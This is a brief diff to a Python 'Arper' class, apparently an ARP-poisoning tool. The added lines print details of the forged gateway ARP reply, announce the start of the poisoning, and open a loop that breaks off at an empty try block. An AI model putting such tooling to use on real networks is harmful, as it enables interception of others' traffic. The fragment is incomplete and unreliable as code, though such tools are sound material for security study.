@@ -56,7 +56,15 @@ class Arper():
         print(f'ip dst: {poison_gateway.pdst}')
         print(f'mac dst: {poison_gateway.hwdst}')
         print(f'mac src: {poison_gateway.hwsrc}')
-        
+        print(poison_gateway.summary())
+        print('_'*30)
+        print(f'Beginning the ARP poison. CTRL+C to stop.')
+        while True:
+            sys.stdout.write('.')
+            sys.stdout.flush()
+            try:
+                
+
 
 
 
